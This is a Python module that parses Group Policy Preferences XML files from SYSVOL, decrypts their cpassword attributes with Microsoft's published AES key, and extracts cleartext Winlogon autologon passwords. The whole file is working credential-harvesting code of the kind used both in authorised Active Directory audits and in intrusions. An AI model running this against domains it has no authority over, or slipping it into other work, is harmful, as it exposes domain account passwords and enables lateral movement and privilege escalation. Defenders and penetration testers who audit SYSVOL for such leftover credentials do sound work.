"""Group Policy Preferences (GPP) cpassword extraction and decryption.

GPP items (Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml,
Drives.xml, Printers.xml) can store credentials in a 'cpassword' attribute,
encrypted with an AES-256 key that Microsoft published in [MS-GPPREF] 2.2.1.1.4.
Anyone who can read SYSVOL can decrypt them (MS14-025).
"""

import base64
import re
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional

from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

# [MS-GPPREF] 2.2.1.1.4 Password Encryption
GPP_AES_KEY = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')

# Attributes that hold the account name, depending on the GPP item type
_USER_ATTRIBUTES = ('userName', 'accountName', 'runAs', 'username', 'newName')


def decrypt_cpassword(cpassword: str) -> Optional[str]:
    """Decrypt a GPP cpassword value. Returns None if it can't be decrypted."""
    if not cpassword:
        return None
    try:
        value = cpassword + '=' * (-len(cpassword) % 4)
        cipher = AES.new(GPP_AES_KEY, AES.MODE_CBC, b'\x00' * 16)
        plain = unpad(cipher.decrypt(base64.b64decode(value)), AES.block_size)
        return plain.decode('utf-16-le')
    except Exception:
        return None


def _decode(content: bytes) -> str:
    if content.startswith((b'\xff\xfe', b'\xfe\xff')):
        return content.decode('utf-16', errors='ignore')
    return content.decode('utf-8-sig', errors='ignore')


def find_cpasswords(content: bytes) -> List[Dict[str, str]]:
    """Return every non-empty cpassword in a GPP XML file.

    Each result has 'user', 'cpassword' and 'password' (decrypted, or '' if
    decryption failed).
    """
    text = _decode(content)
    results = []

    try:
        root = ET.fromstring(text)
        elements = [el for el in root.iter() if el.attrib.get('cpassword')]
        for el in elements:
            user = next((el.attrib[a] for a in _USER_ATTRIBUTES if el.attrib.get(a)), '')
            cpassword = el.attrib['cpassword']
            results.append({
                'user': user,
                'cpassword': cpassword,
                'password': decrypt_cpassword(cpassword) or '',
            })
        return results
    except ET.ParseError:
        pass

    # Fallback for malformed XML: regex over each element's attributes
    for tag in re.findall(r'<[^>]*\bcpassword="[^"]+"[^>]*>', text):
        cpassword = re.search(r'\bcpassword="([^"]+)"', tag).group(1)
        user = ''
        for attr in _USER_ATTRIBUTES:
            match = re.search(rf'\b{attr}="([^"]*)"', tag)
            if match and match.group(1):
                user = match.group(1)
                break
        results.append({
            'user': user,
            'cpassword': cpassword,
            'password': decrypt_cpassword(cpassword) or '',
        })
    return results


def find_autologon(content: bytes) -> List[Dict[str, str]]:
    """Return autologon credentials from a GPP Registry.xml.

    GPP registry items for Winlogon AutoAdminLogon store DefaultPassword in
    cleartext (no cpassword encryption). Items are <Properties name=".."
    value=".."/> elements; values are grouped per Registry.xml file.
    Returns [{'user', 'domain', 'password'}] when a non-empty DefaultPassword exists.
    """
    text = _decode(content)
    try:
        root = ET.fromstring(text)
    except ET.ParseError:
        return []
    values: Dict[str, List[str]] = {}
    for el in root.iter():
        if el.tag.split('}')[-1] != 'Properties':
            continue
        name = (el.attrib.get('name') or '').lower()
        if name in ('defaultpassword', 'defaultusername', 'defaultdomainname'):
            values.setdefault(name, []).append(el.attrib.get('value', ''))
    passwords = [p for p in values.get('defaultpassword', []) if p]
    if not passwords:
        return []
    users = values.get('defaultusername', []) or ['']
    domains = values.get('defaultdomainname', []) or ['']
    return [{'user': users[min(i, len(users) - 1)], 'domain': domains[min(i, len(domains) - 1)], 'password': pw}
            for i, pw in enumerate(passwords)]
